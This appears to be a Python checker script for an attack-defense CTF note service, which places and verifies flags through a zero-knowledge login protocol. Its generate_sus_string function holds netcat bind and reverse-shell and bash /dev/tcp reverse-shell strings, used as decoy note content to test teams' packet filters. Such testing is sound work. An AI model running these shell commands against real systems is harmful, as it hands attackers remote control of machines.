#!/usr/bin/env python3

import logging, secrets, random, os
from base64 import b64encode
from socket import MSG_PEEK, socket, create_connection, setdefaulttimeout
from typing import Tuple, Optional
from math import ceil

from ctf_gameserver import checkerlib

port = 1338
filename_alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_+-"
prompt = b"> "
setdefaulttimeout(5.0)

class NotesFromTheFutureChecker(checkerlib.BaseChecker):

    def place_flag(self, tick):
        flag = checkerlib.get_flag(tick)
        try:
            with create_connection((self.ip, port)) as conn:
                g, p = receive_public_parameters(conn)
                recv_until(conn, prompt)
                x_title = create_note(conn, flag, g, p)
        except Exception:
            logging.error(f"Unable to connect to server")
            return checkerlib.CheckResult.DOWN, "unable to connect to server"

        if x_title is None:
            return checkerlib.CheckResult.FAULTY, "place flag failed"

        x, title = x_title
        checkerlib.store_state(f"{tick}", (title, x))
        checkerlib.set_flagid(f"{title}")
        return checkerlib.CheckResult.OK, ""

    def check_service(self):
        with create_connection((self.ip, port)) as conn:
            g, p = receive_public_parameters(conn)
            if pow(g, p, p) != g:
                logging.error(f"public parameters are faulty g:{g:#x}, p:{p:#x}, {pow(g, p, p)} != {g}")
                return checkerlib.CheckResult.FAULTY, f"public parameters are faulty g:{g:#x}, p:{p:#x}, {pow(g, p, p)} != {g}"
            recv_until(conn, prompt)

            logging.info(f"listing notes")
            send_line(conn, "ls")
            titles = recv_until(conn, b"\n"+prompt).split("\n")
            if not titles:
                logging.error(f"service does not respond to note listing")
                return checkerlib.CheckResult.FAULTY, "service does not respond to note listing"

            # create a new file
            logging.info(f"creating a new tmp note")
            tmp_content = generate_sus_string()
            tmp_x_title = create_note(conn, tmp_content, g, p)
            if tmp_x_title is None:
                return checkerlib.CheckResult.FAULTY, "Temporary note creation failed"
            tmp_x, tmp_title = tmp_x_title

            # TODO create file with illegal name

            # attempt to open another file a few times
            attempts = ceil( (624*32)/(p.bit_length()-1) ) +2  # + randbelow, actual reading
            attempts = secrets.randbelow(attempts)
            attempt_title = secrets.choice(titles)
            attempt_secret = secrets.randbelow(p)

            logging.info(f"attempting to read note '{attempt_title}' with random secret {attempts} times")
            l = logging.getLogger().level
            logging.getLogger().setLevel(logging.CRITICAL)
            for _ in range(attempts):
                read_note(conn, attempt_secret, attempt_title, g, p)
            logging.getLogger().setLevel(l)

            # read the file again
            logging.info(f"checking tmp note contents")
            remote_tmp_content = read_note(conn, tmp_x, tmp_title, g, p)
            if tmp_content != remote_tmp_content:
                logging.error(f"creating and reading a note transformed '{tmp_content}' to '{remote_tmp_content}'")
                return checkerlib.CheckResult.FAULTY, "Note contents don't match"

        return checkerlib.CheckResult.OK, ""

    def check_flag(self, tick):
        flag = checkerlib.get_flag(tick)
        with create_connection((self.ip, port)) as conn:
            g, p = receive_public_parameters(conn)
            recv_until(conn, prompt)
            state = checkerlib.load_state(f"{tick}")
            if state is None:
                logging.warning(f"could not load state {tick}, falling back to flag not found")
                return checkerlib.CheckResult.FLAG_NOT_FOUND, "state is none"
            title, x = state
            remote_flag = read_note(conn, x, title, g, p)
        if remote_flag != flag:
            logging.error(f"[{tick}] remote flag '{remote_flag}' did not match the saved flag '{flag}'")
            return checkerlib.CheckResult.FLAG_NOT_FOUND, "flag mismatch"
        return checkerlib.CheckResult.OK, ""

def create_note(conn :socket, content :str, g :int, p :int) -> Optional[Tuple[int, str]]:
    """
    talks the protocol to create a new note with the given parameters

    :returns: x and title used
    """

    logging.info(f"▶ creating new note")
    # try guessing names until one is free
    while True:
        title = "".join(secrets.choice(filename_alphabet) for _ in range(64))  # TODO funny names
        send_line(conn, f"create {title}")
        if "fail" in (line:=recv_line(conn)):  # file already exists
            logging.warning(f"note {title} most likely already exists '{line}'")
            recv_until(conn, prompt)
            continue
        break
    logging.info(f"title={title}")

    # set y
    x = generate_random_element(g, p)
    y = pow(g, x, p)
    recv_until(conn, b"<--")
    send_line(conn, f"{y:#x}")

    if not proove_knowledge(conn, x, g, p):
        return None
    logging.debug(recv_line(conn))

    send_line(conn, content)
    send_line(conn, "")
    recv_until(conn, prompt)
    return x, title

def read_note(conn :socket, x :int, title :str, g :int, p :int) -> Optional[str]:
    """
    talks the protocol to read a note with the given parameters

    :returns: contents read
    """

    logging.info(f"▶ reading {title}")
    cmd = f"read {title}"

    send_line(conn, cmd)
    if "fail" in (response := recv_line(conn)):
        logging.error(f"failed to execute '{cmd}': {response}")
        recv_until(conn, prompt)
        return None

    if not proove_knowledge(conn, x, g, p):
        recv_until(conn, prompt)
        return None

    _ = recv_line(conn)  # here are the contents ...
    content = recv_until(conn, b"\n\n")
    recv_until(conn, prompt)
    return content

def receive_public_parameters(conn :socket) -> Tuple[int, int]:
    """
    extracts the public parameters g and p from the server messages
    assumes format 'g=\\S* .*p=\\S*'

    :returns: g, p
    """

    recv_until(conn, b"g=")
    g = int(recv_until(conn, b" "), 16)

    recv_until(conn, b"p=")
    p = int(recv_until(conn, b" "), 16)

    logging.info(f"public parameters: g={g:#x} p=({p.bit_length()}-bit prime)")
    return g, p

def proove_knowledge(conn :socket, x :int, g :int, p :int) -> bool:
    """
    talk the zero knowledge protocol with the server
    y is extracted from the messages

    :returns: True iff the proof succeeded
    """

    logging.info(f"starting ZKProof")
    recv_until(conn, b"y=")
    remote_y = int(recv_until(conn, b" "), 16)

    if remote_y != pow(g, x, p):
        logging.warning(f"remote y differs from local y")

    # <-- [r]
    r = generate_random_element(g, p)
    t = pow(g, r, p)
    recv_until(conn, b"<--")
    send_line(conn, f"{t:#x}")

    # --> c
    recv_until(conn, b"-->")
    c = int(recv_line(conn), 16)

    # <-- s ≡ r + c·x mod q
    s = (r + c*x) % (p-1)
    recv_until(conn, b"<--")
    send_line(conn, f"{s:#x}")

    response = recv_line(conn)
    if 'fail' in response:
        logging.error(f"✗ '{response}'")
    else:
        logging.info(f"✓ '{response}'")
    return "fail" not in response

def send_line(conn :socket, msg :str):
    b_msg = f"{msg}\n".encode()
    logging.debug(f">>> {b_msg}")
    conn.sendall(b_msg)

def recv_line(conn :socket, drop=True) -> str:
    return recv_until(conn, delim=b"\n", drop=drop)

def recv_until(conn :socket, delim :bytes =b"\n", drop :bool =True) -> str:
    buffer = bytearray()
    sz = 0x1000
    while True:
        received = conn.recv(sz, MSG_PEEK)
        if len(received) == 0:
            raise EOFError('Unexpected EOF')
        if (idx := (buffer+received).find(delim)) != -1:
            assert idx+len(delim) >= len(buffer), f"{idx} < {len(buffer)} ... {buffer} waiting for {delim}"
            buffer.extend(conn.recv(idx + len(delim) - len(buffer)))
            break
        else:
            # do NOT receive sz, you could get more unchecked input and skip the delim
            buffer.extend(conn.recv(len(received)))
    logging.debug(f"<<< {buffer}")
    if drop:
        buffer = buffer[:-len(delim)]
    return buffer.decode()

def generate_sus_string():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
        b64encode(os.urandom(random.randint(4, 128))).decode(),
        'A' * random.randint(4, 16),
        'B' * random.randint(4, 16),
        'Never gonna give you up, never gonna let you down',
      	'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
        '/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
        '/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ])

def generate_random_element(g :int, p :int):
    "samples element from mult group Z_p, assumes p is prime"
    return pow(g, secrets.randbelow(p-1), p)

if __name__ == '__main__':
    checkerlib.run_check(NotesFromTheFutureChecker)
